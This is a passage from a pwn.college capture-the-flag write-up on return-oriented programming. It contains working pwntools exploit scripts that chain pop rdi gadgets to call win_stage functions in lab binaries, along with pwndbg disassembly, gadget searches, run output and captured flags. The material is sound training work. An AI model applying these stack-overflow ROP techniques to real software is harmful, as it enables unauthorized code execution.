attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/chain-of-command-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~chain-of-command-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/chain-of-command-easy': pid 10627
/home/hacker/script.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (1.74KB)
[*] Process '/challenge/chain-of-command-easy' stopped with exit code -11 (SIGSEGV) (pid 10627)
[!!!] FLAG FOUND !!!

Received 240 bytes! This is potentially 15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 16 gadgets of ROP chain at 0x7fff0ad0d978.
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000001: (UNMAPPED MEMORY)
| 0x00000000004028ba: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 1 ; je 0x4028e9 ; lea rdi, [rip + 0x8b9] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000002: (UNMAPPED MEMORY)
| 0x0000000000402615: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 2 ; je 0x402644 ; lea rdi, [rip + 0xb5e] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000003: (UNMAPPED MEMORY)
| 0x00000000004026f5: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 3 ; je 0x402724 ; lea rdi, [rip + 0xa7e] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000004: (UNMAPPED MEMORY)
| 0x000000000040252f: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 4 ; je 0x40255e ; lea rdi, [rip + 0xc44] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000005: (UNMAPPED MEMORY)
| 0x00000000004027d7: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 5 ; je 0x402806 ; lea rdi, [rip + 0x99c] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
pwn.college{AKuLaEeHPistmjz7_PyUH9Qd5vM.0VN0MDL4ITM0EzW}
```

&nbsp;

## Chain of Command (Hard)

Requirements to craft an exploit:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  write@plt
0x00000000004010f0  printf@plt
0x0000000000401100  lseek@plt
0x0000000000401110  close@plt
0x0000000000401120  read@plt
0x0000000000401130  setvbuf@plt
0x0000000000401140  open@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  bin_padding
0x0000000000402079  win_stage_2
0x0000000000402159  win_stage_3
0x000000000040223b  win_stage_1
0x0000000000402317  win_stage_5
0x00000000004023fa  win_stage_4
0x00000000004024e0  challenge
0x000000000040251f  main
0x00000000004025e0  __libc_csu_init
0x0000000000402650  __libc_csu_fini
0x0000000000402658  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004024e0 <+0>:     endbr64
   0x00000000004024e4 <+4>:     push   rbp
   0x00000000004024e5 <+5>:     mov    rbp,rsp
   0x00000000004024e8 <+8>:     add    rsp,0xffffffffffffff80
   0x00000000004024ec <+12>:    mov    DWORD PTR [rbp-0x64],edi
   0x00000000004024ef <+15>:    mov    QWORD PTR [rbp-0x70],rsi
   0x00000000004024f3 <+19>:    mov    QWORD PTR [rbp-0x78],rdx
   0x00000000004024f7 <+23>:    lea    rax,[rbp-0x60]
   0x00000000004024fb <+27>:    mov    edx,0x1000
   0x0000000000402500 <+32>:    mov    rsi,rax
   0x0000000000402503 <+35>:    mov    edi,0x0
   0x0000000000402508 <+40>:    call   0x401120 <read@plt>
   0x000000000040250d <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402510 <+48>:    lea    rdi,[rip+0xb0b]        # 0x403022
   0x0000000000402517 <+55>:    call   0x4010d0 <puts@plt>
   0x000000000040251c <+60>:    nop
   0x000000000040251d <+61>:    leave
   0x000000000040251e <+62>:    ret
End of assembler dump.
```

A the call to `read@plt` is made at `challenge+40`. Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x402508
```

```
pwndbg> run
Starting program: /challenge/chain-of-command-hard 
###
### Welcome to /challenge/chain-of-command-hard!
###


Breakpoint 1, 0x0000000000402508 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd74326e20 ◂— 0
 RBX  0x4025e0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffd74326e20 ◂— 0
 R8   0
 R9   0x31
 R10  0xfffffffffffff58f
 R11  0x7a3d9e266ce0 (setvbuf) ◂— endbr64 
 R12  0x401150 (_start) ◂— endbr64 
 R13  0x7ffd74326fa0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd74326e80 —▸ 0x7ffd74326eb0 ◂— 0
 RSP  0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
 RIP  0x402508 (challenge+40) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x402508 <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd74326e20 ◂— 0
        nbytes: 0x1000
 
   0x40250d <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x402510 <challenge+48>    lea    rdi, [rip + 0xb0b]           RDI => 0x403022 ◂— 'Leaving!'
   0x402517 <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x40251c <challenge+60>    nop    
   0x40251d <challenge+61>    leave  
   0x40251e <challenge+62>    ret    
 
   0x40251f <main>            endbr64 
   0x402523 <main+4>          push   rbp
   0x402524 <main+5>          mov    rbp, rsp
   0x402527 <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
01:0008│-078     0x7ffd74326e08 —▸ 0x7ffd74326fb8 —▸ 0x7ffd74327687 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-070     0x7ffd74326e10 —▸ 0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
03:0018│-068     0x7ffd74326e18 ◂— 0x19e2745dd
04:0020│ rax rsi 0x7ffd74326e20 ◂— 0
05:0028│-058     0x7ffd74326e28 —▸ 0x7a3d9e3cf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0030│-050     0x7ffd74326e30 ◂— 0
07:0038│-048     0x7ffd74326e38 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402508 challenge+40
   1         0x4025c4 main+165
   2   0x7a3d9e206083 __libc_start_main+243
   3         0x40117e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffd74326e20`
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd74326e90:
 rip = 0x402508 in challenge; saved rip = 0x4025c4
 called by frame at 0x7ffd74326ec0
 Arglist at 0x7ffd74326e80, args: 
 Locals at 0x7ffd74326e80, Previous frame's sp is 0x7ffd74326e90
 Saved registers:
  rbp at 0x7ffd74326e80, rip at 0x7ffd74326e88
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

Now, let's get the offsets of such instructions within the `win_stage_*()` functions that we skip the argument checks.

#### `win_stage_1()`

```
pwndbg> disassemble win_stage_1
Dump of assembler code for function win_stage_1:
   0x000000000040223b <+0>:     endbr64
   0x000000000040223f <+4>:     push   rbp
   0x0000000000402240 <+5>:     mov    rbp,rsp
   0x0000000000402243 <+8>:     sub    rsp,0x120
   0x000000000040224a <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x0000000000402250 <+21>:    cmp    DWORD PTR [rbp-0x114],0x1
   0x0000000000402257 <+28>:    je     0x40226a <win_stage_1+47>
   0x0000000000402259 <+30>:    lea    rdi,[rip+0xda4]        # 0x403004
   0x0000000000402260 <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402265 <+42>:    jmp    0x402315 <win_stage_1+218>
   0x000000000040226a <+47>:    mov    esi,0x0
   
# ---- snip ----

   0x0000000000402315 <+218>:   leave
   0x0000000000402316 <+219>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_2()`

```
pwndbg> disassemble win_stage_2
Dump of assembler code for function win_stage_2:
   0x0000000000402079 <+0>:     endbr64
   0x000000000040207d <+4>:     push   rbp
   0x000000000040207e <+5>:     mov    rbp,rsp
   0x0000000000402081 <+8>:     sub    rsp,0x120
   0x0000000000402088 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040208e <+21>:    cmp    DWORD PTR [rbp-0x114],0x2
   0x0000000000402095 <+28>:    je     0x4020a8 <win_stage_2+47>
   0x0000000000402097 <+30>:    lea    rdi,[rip+0xf66]        # 0x403004
   0x000000000040209e <+37>:    call   0x4010d0 <puts@plt>
   0x00000000004020a3 <+42>:    jmp    0x402157 <win_stage_2+222>
   0x00000000004020a8 <+47>:    mov    esi,0x0

# ---- snip ----

   0x0000000000402157 <+222>:   leave
   0x0000000000402158 <+223>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1` 
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_3()`

```
pwndbg> disassemble win_stage_3
Dump of assembler code for function win_stage_3:
   0x0000000000402159 <+0>:     endbr64
   0x000000000040215d <+4>:     push   rbp
   0x000000000040215e <+5>:     mov    rbp,rsp
   0x0000000000402161 <+8>:     sub    rsp,0x120
   0x0000000000402168 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040216e <+21>:    cmp    DWORD PTR [rbp-0x114],0x3
   0x0000000000402175 <+28>:    je     0x402188 <win_stage_3+47>
   0x0000000000402177 <+30>:    lea    rdi,[rip+0xe86]        # 0x403004
   0x000000000040217e <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402183 <+42>:    jmp    0x402239 <win_stage_3+224>
   0x0000000000402188 <+47>:    mov    esi,0x0

# ---- snip ----

   0x0000000000402239 <+224>:   leave
   0x000000000040223a <+225>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_4()`

```
pwndbg> disassemble win_stage_4
Dump of assembler code for function win_stage_4:
   0x00000000004023fa <+0>:     endbr64
   0x00000000004023fe <+4>:     push   rbp
   0x00000000004023ff <+5>:     mov    rbp,rsp
   0x0000000000402402 <+8>:     sub    rsp,0x120
   0x0000000000402409 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040240f <+21>:    cmp    DWORD PTR [rbp-0x114],0x4
   0x0000000000402416 <+28>:    je     0x402429 <win_stage_4+47>
   0x0000000000402418 <+30>:    lea    rdi,[rip+0xbe5]        # 0x403004
   0x000000000040241f <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402424 <+42>:    jmp    0x4024de <win_stage_4+228>
   0x0000000000402429 <+47>:    mov    esi,0x0

# ---- snip ----

   0x00000000004024de <+228>:   leave
   0x00000000004024df <+229>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_5()`

```
pwndbg> disassemble win_stage_5
Dump of assembler code for function win_stage_5:
   0x0000000000402317 <+0>:     endbr64
   0x000000000040231b <+4>:     push   rbp
   0x000000000040231c <+5>:     mov    rbp,rsp
   0x000000000040231f <+8>:     sub    rsp,0x120
   0x0000000000402326 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040232c <+21>:    cmp    DWORD PTR [rbp-0x114],0x5
   0x0000000000402333 <+28>:    je     0x402346 <win_stage_5+47>
   0x0000000000402335 <+30>:    lea    rdi,[rip+0xcc8]        # 0x403004
   0x000000000040233c <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402341 <+42>:    jmp    0x4023f8 <win_stage_5+225>
   0x0000000000402346 <+47>:    mov    esi,0x0

# ---- snip ----

   0x00000000004023f8 <+225>:   leave
   0x00000000004023f9 <+226>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x402317`
- [x] Argument expected by `win_stage_5()`: `0x5`
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `pop rdi ; ret` gadget

Now let's find the address of the `pop rdi ; ret` gadget.

```
hacker@return-oriented-programming~chain-of-command-hard:/$ ROPgadget --binary /challenge/chain-of-command-hard | grep "pop rdi ; ret"
0x0000000000402643 : pop rdi ; ret
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x402317`
- [x] Argument expected by `win_stage_5()`: `0x5`
- [x] Offset of `pop rdi ; ret` gadget within the program: `0x402643`

### ROP chain

The ROP chain in this challenge, will be the same as the [last level](#rop-chain), only with different addresses.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x40223b
win_stage_1_arg = 1
win_stage_2_offset = 0x402079
win_stage_2_arg = 2
win_stage_3_offset = 0x402159
win_stage_3_arg = 3
win_stage_4_offset = 0x4023fa
win_stage_4_arg = 4
win_stage_5_offset = 0x402317
win_stage_5_arg = 5

buffer_addr = 0x7ffd74326e20
addr_of_saved_ip = 0x7ffd74326e88

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Gadget address found
pop_rdi_ret = 0x402643

# Base offset to reach the return address
payload = b"A" * offset

# Stage 1: win_stage_1(1)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(win_stage_1_offset)

# Stage 2: win_stage_2(2)
payload += p64(pop_rdi_ret)
payload += p64(2)
payload += p64(win_stage_2_offset)

# Stage 3: win_stage_3(3)
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(win_stage_3_offset)

# Stage 4: win_stage_4(4)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(win_stage_4_offset)

# Stage 5: win_stage_5(5)
payload += p64(pop_rdi_ret)
payload += p64(5)
payload += p64(win_stage_5_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/chain-of-command-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~chain-of-command-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/chain-of-command-hard': pid 13432
[+] Receiving all data: Done (124B)
[*] Process '/challenge/chain-of-command-hard' stopped with exit code -11 (SIGSEGV) (pid 13432)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/chain-of-command-hard!
###

Leaving!
pwn.college{EUjrXInTnvQAkZEX53BXXgHbktj.0lN0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP (Easy)

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ /challenge/stop-pop-and-rop-easy 
###
### Welcome to /challenge/stop-pop-and-rop-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffc3ab87820.
```

So the challenge gives is the location of the buffer. Let's obtain the offset.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  cs_free@plt
0x0000000000401130  printf@plt
0x0000000000401140  read@plt
0x0000000000401150  strcmp@plt
0x0000000000401160  cs_disasm@plt
0x0000000000401170  mincore@plt
0x0000000000401180  setvbuf@plt
0x0000000000401190  cs_open@plt
0x00000000004011a0  cs_close@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  print_gadget
0x000000000040168d  print_chain
0x00000000004016fb  bin_padding
0x0000000000401e1a  free_gadgets
0x0000000000401e65  challenge
0x000000000040200a  main
0x00000000004020d0  __libc_csu_init
0x0000000000402140  __libc_csu_fini
0x0000000000402148  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401e65 <+0>:     endbr64
   0x0000000000401e69 <+4>:     push   rbp
   0x0000000000401e6a <+5>:     mov    rbp,rsp
   0x0000000000401e6d <+8>:     sub    rsp,0xb0
   0x0000000000401e74 <+15>:    mov    DWORD PTR [rbp-0x94],edi
   0x0000000000401e7a <+21>:    mov    QWORD PTR [rbp-0xa0],rsi
   0x0000000000401e81 <+28>:    mov    QWORD PTR [rbp-0xa8],rdx
   0x0000000000401e88 <+35>:    lea    rdi,[rip+0x1309]        # 0x403198
   0x0000000000401e8f <+42>:    call   0x401110 <puts@plt>
   0x0000000000401e94 <+47>:    lea    rdi,[rip+0x1375]        # 0x403210
   0x0000000000401e9b <+54>:    call   0x401110 <puts@plt>
   0x0000000000401ea0 <+59>:    mov    rax,rsp
   0x0000000000401ea3 <+62>:    mov    QWORD PTR [rip+0x3236],rax        # 0x4050e0 <sp_>
   0x0000000000401eaa <+69>:    mov    rax,rbp
   0x0000000000401ead <+72>:    mov    QWORD PTR [rip+0x320c],rax        # 0x4050c0 <bp_>
   0x0000000000401eb4 <+79>:    mov    rdx,QWORD PTR [rip+0x3205]        # 0x4050c0 <bp_>
   0x0000000000401ebb <+86>:    mov    rax,QWORD PTR [rip+0x321e]        # 0x4050e0 <sp_>
   0x0000000000401ec2 <+93>:    sub    rdx,rax
   0x0000000000401ec5 <+96>:    mov    rax,rdx
   0x0000000000401ec8 <+99>:    shr    rax,0x3
   0x0000000000401ecc <+103>:   add    rax,0x2
   0x0000000000401ed0 <+107>:   mov    QWORD PTR [rip+0x31f9],rax        # 0x4050d0 <sz_>
   0x0000000000401ed7 <+114>:   mov    rax,QWORD PTR [rip+0x31e2]        # 0x4050c0 <bp_>
   0x0000000000401ede <+121>:   add    rax,0x8
   0x0000000000401ee2 <+125>:   mov    QWORD PTR [rip+0x31ef],rax        # 0x4050d8 <rp_>
   0x0000000000401ee9 <+132>:   lea    rdi,[rip+0x1388]        # 0x403278
   0x0000000000401ef0 <+139>:   call   0x401110 <puts@plt>
   0x0000000000401ef5 <+144>:   lea    rdi,[rip+0x13b4]        # 0x4032b0
   0x0000000000401efc <+151>:   call   0x401110 <puts@plt>
   0x0000000000401f01 <+156>:   lea    rdi,[rip+0x13d8]        # 0x4032e0
   0x0000000000401f08 <+163>:   call   0x401110 <puts@plt>
   0x0000000000401f0d <+168>:   lea    rdi,[rip+0x140c]        # 0x403320
   0x0000000000401f14 <+175>:   call   0x401110 <puts@plt>
   0x0000000000401f19 <+180>:   lea    rdi,[rip+0x1420]        # 0x403340
   0x0000000000401f20 <+187>:   call   0x401110 <puts@plt>
   0x0000000000401f25 <+192>:   lea    rdi,[rip+0x144c]        # 0x403378
   0x0000000000401f2c <+199>:   call   0x401110 <puts@plt>
   0x0000000000401f31 <+204>:   lea    rdi,[rip+0x1478]        # 0x4033b0
   0x0000000000401f38 <+211>:   call   0x401110 <puts@plt>
   0x0000000000401f3d <+216>:   lea    rax,[rbp-0x90]
   0x0000000000401f44 <+223>:   mov    rsi,rax
   0x0000000000401f47 <+226>:   lea    rdi,[rip+0x14aa]        # 0x4033f8
   0x0000000000401f4e <+233>:   mov    eax,0x0
   0x0000000000401f53 <+238>:   call   0x401130 <printf@plt>
   0x0000000000401f58 <+243>:   lea    rax,[rbp-0x90]
   0x0000000000401f5f <+250>:   mov    edx,0x1000
   0x0000000000401f64 <+255>:   mov    rsi,rax
   0x0000000000401f67 <+258>:   mov    edi,0x0
   0x0000000000401f6c <+263>:   call   0x401140 <read@plt>
   0x0000000000401f71 <+268>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401f74 <+271>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401f77 <+274>:   cdqe
   0x0000000000401f79 <+276>:   lea    rcx,[rbp-0x90]
   0x0000000000401f80 <+283>:   mov    rdx,QWORD PTR [rip+0x3151]        # 0x4050d8 <rp_>
   0x0000000000401f87 <+290>:   sub    rcx,rdx
   0x0000000000401f8a <+293>:   mov    rdx,rcx
   0x0000000000401f8d <+296>:   add    rax,rdx
   0x0000000000401f90 <+299>:   shr    rax,0x3
   0x0000000000401f94 <+303>:   mov    rdx,rax
   0x0000000000401f97 <+306>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401f9a <+309>:   mov    esi,eax
   0x0000000000401f9c <+311>:   lea    rdi,[rip+0x1485]        # 0x403428
   0x0000000000401fa3 <+318>:   mov    eax,0x0
   0x0000000000401fa8 <+323>:   call   0x401130 <printf@plt>
   0x0000000000401fad <+328>:   lea    rdi,[rip+0x14ac]        # 0x403460
   0x0000000000401fb4 <+335>:   call   0x401110 <puts@plt>
   0x0000000000401fb9 <+340>:   lea    rdi,[rip+0x1508]        # 0x4034c8
   0x0000000000401fc0 <+347>:   call   0x401110 <puts@plt>
   0x0000000000401fc5 <+352>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401fc8 <+355>:   cdqe
   0x0000000000401fca <+357>:   lea    rcx,[rbp-0x90]
   0x0000000000401fd1 <+364>:   mov    rdx,QWORD PTR [rip+0x3100]        # 0x4050d8 <rp_>
   0x0000000000401fd8 <+371>:   sub    rcx,rdx
   0x0000000000401fdb <+374>:   mov    rdx,rcx
   0x0000000000401fde <+377>:   add    rax,rdx
   0x0000000000401fe1 <+380>:   shr    rax,0x3
   0x0000000000401fe5 <+384>:   add    eax,0x1
   0x0000000000401fe8 <+387>:   mov    edx,eax
   0x0000000000401fea <+389>:   mov    rax,QWORD PTR [rip+0x30e7]        # 0x4050d8 <rp_>
   0x0000000000401ff1 <+396>:   mov    esi,edx
   0x0000000000401ff3 <+398>:   mov    rdi,rax
   0x0000000000401ff6 <+401>:   call   0x40168d <print_chain>
   0x0000000000401ffb <+406>:   lea    rdi,[rip+0x1508]        # 0x40350a
   0x0000000000402002 <+413>:   call   0x401110 <puts@plt>
   0x0000000000402007 <+418>:   nop
